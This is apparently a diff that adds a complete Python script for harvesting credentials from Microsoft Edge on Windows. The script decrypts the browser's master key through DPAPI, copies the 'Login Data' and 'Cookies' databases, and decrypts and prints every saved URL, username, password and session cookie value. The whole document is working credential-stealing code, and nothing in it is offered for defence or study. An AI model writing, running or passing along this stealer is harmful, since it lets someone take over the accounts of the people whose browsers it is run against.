@@ -1,0 +1,139 @@
+ import os, json, sqlite3, base64, shutil
+ prereqs_ok = True
+ try:
+     from Cryptodome.Cipher import AES
+     import win32crypt
+ except ImportError:
+     print('Error: Please install required packages: pip install pycryptodomex pypiwin32')
+     prereqs_ok = False
+     exit()
+
+ def get_master_key(base_path):
+     local_state_path = os.path.join(base_path, 'Local State')
+     master_key = None
+     if not os.path.exists(local_state_path):
+         print(f'[-] Local State not found at {local_state_path}')
+         return None
+     try:
+         with open(local_state_path, 'r', encoding='utf-8') as f:
+             ls = json.load(f)
+         encrypted_key = base64.b64decode(ls['os_crypt']['encrypted_key'])
+         encrypted_key = encrypted_key[5:] # Remove DPAPI prefix
+         master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
+         print('[+] Master key decrypted successfully.')
+     except Exception as e:
+         print(f'[-] Failed to get master key: {e}')
+         return None
+     return master_key
+
+ def decrypt_payload(cipher, payload):
+     return cipher.decrypt(payload)
+
+ def generate_cipher(aes_key, iv):
+     return AES.new(aes_key, AES.MODE_GCM, iv)
+
+ def decrypt_value(encrypted_value, master_key):
+     if not master_key or not encrypted_value:
+         return 'N/A'
+     try:
+         # Try AES-GCM (v10/v11 prefix)
+         if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
+             iv = encrypted_value[3:15]
+             payload = encrypted_value[15:]
+             cipher = generate_cipher(master_key, iv)
+             decrypted_pass = decrypt_payload(cipher, payload)
+             decrypted_pass = decrypted_pass[:-16].decode() # Remove 16-byte auth tag
+             return decrypted_pass
+         else:
+             # Fallback to older DPAPI only (less common for recent Chrome/Edge)
+             return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode()
+     except Exception as e:
+         # Shorten error message for readability
+         return f'N/A (Decryption Failed: {str(e)[:50]})'
+
+
+ def extract_data(db_path, master_key, data_type):
+     if not os.path.exists(db_path):
+         print(f'[-] {data_type} file not found: {db_path}')
+         return
+
+     print(f'\n--- Extracting {data_type} from {db_path} ---')
+     # Use a temporary file in the TEMP directory or current dir if TEMP is not set
+     temp_dir = os.getenv('TEMP', '.')
+     temp_db_path = os.path.join(temp_dir, f'temp_{data_type.lower().replace(" ", "_")}.db')
+
+     try:
+         shutil.copy2(db_path, temp_db_path) # Copy to temp to avoid lock
+         conn = sqlite3.connect(temp_db_path)
+         cursor = conn.cursor()
+
+         if data_type == 'Passwords':
+             cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
+             print('Found passwords:')
+             for row in cursor.fetchall():
+                 origin_url, username, enc_password = row
+                 password = decrypt_value(enc_password, master_key)
+                 print(f'  URL: {origin_url}\n  Username: {username}\n  Password: {password}\n  --------------------')
+         elif data_type == 'Cookies':
+             cursor.execute('SELECT host_key, name, value, encrypted_value, expires_utc, is_secure, path FROM cookies')
+             print('Found cookies:')
+             for row in cursor.fetchall():
+                 host, name, value, enc_value, expires, secure, path_val = row
+                 dec_value = ''
+                 if value: # If plain value exists, use it
+                     dec_value = value
+                 elif enc_value: # Otherwise, try to decrypt encrypted_value
+                     dec_value = decrypt_value(enc_value, master_key)
+                 print(f'  Host: {host}\n  Name: {name}\n  Value: {dec_value}\n  Path: {path_val}\n  Secure: {"Yes" if secure else "No"}\n  Expires UTC: {expires}\n  --------------------')
+     except sqlite3.Error as e:
+         print(f'[-] SQLite error with {data_type}: {e}')
+     except Exception as e:
+         print(f'[-] Error processing {data_type}: {e}')
+     finally:
+         if 'conn' in locals() and conn:
+             conn.close()
+         if os.path.exists(temp_db_path):
+             os.remove(temp_db_path)
+
+ if __name__ == "__main__":
+     if not prereqs_ok:
+         exit(1)
+
+     app_data_path = os.getenv('LOCALAPPDATA')
+     if not app_data_path:
+         print('[-] LOCALAPPDATA environment variable not found.')
+         exit(1)
+
+     edge_user_data_path = os.path.join(app_data_path, 'Microsoft', 'Edge', 'User Data')
+     default_profile_path = os.path.join(edge_user_data_path, 'Default') # Assumes 'Default' profile
+
+     print(f'[*] Using Edge User Data Path: {edge_user_data_path}')
+     print(f'[*] Using Profile Path: {default_profile_path}')
+
+     if not os.path.isdir(default_profile_path):
+         print(f'[-] Default profile path not found: {default_profile_path}')
+         # Try to list available profiles
+         profiles = []
+         if os.path.isdir(edge_user_data_path):
+             try:
+                 profiles = [d for d in os.listdir(edge_user_data_path) if os.path.isdir(os.path.join(edge_user_data_path, d)) and (d == "Default" or d.startswith("Profile"))]
+             except OSError:
+                 pass # Ignore if cannot list
+         if profiles:
+             print(f'    Available profiles: {", ".join(profiles)}. If not "Default", edit the script to change "default_profile_path".')
+         else:
+             print('    No profiles found in Edge User Data path.')
+         exit(1)
+
+     master_key_val = get_master_key(edge_user_data_path)
+
+     if master_key_val:
+         login_data_db = os.path.join(default_profile_path, 'Login Data')
+         cookies_db = os.path.join(default_profile_path, 'Cookies')
+
+         extract_data(login_data_db, master_key_val, 'Passwords')
+         extract_data(cookies_db, master_key_val, 'Cookies')
+     else:
+         print('[-] Master key could not be obtained. Cannot decrypt passwords/cookies.')
+
+     print('\n[*] Extraction attempt finished.')
